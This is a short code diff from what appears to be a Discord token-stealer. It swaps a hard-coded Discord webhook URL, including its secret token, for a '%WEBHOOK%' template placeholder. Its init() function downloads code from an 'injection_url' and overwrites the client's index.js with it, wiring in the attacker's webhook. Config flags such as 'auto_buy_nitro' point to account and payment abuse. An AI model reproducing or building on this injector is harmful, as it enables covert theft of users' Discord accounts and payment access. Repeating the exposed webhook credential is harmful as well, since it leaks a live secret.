@@ -6,7 +6,7 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: 'https://discord.com/api/webhooks/1193940355742175312/kDCJG33U9wlz4BwOlcJeqj8-s_dTzN3OJS-6A3raPpyVPi-qtN_R7edOtMQ_kQIumMOS', 
+  webhook: '%WEBHOOK%', 
   webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: false, 
   ping_on_run: true, 
@@ -444,7 +444,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('%RRN%', '${config.webhook}')
+        res.replace('%WEBHOOK%', '${config.webhook}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
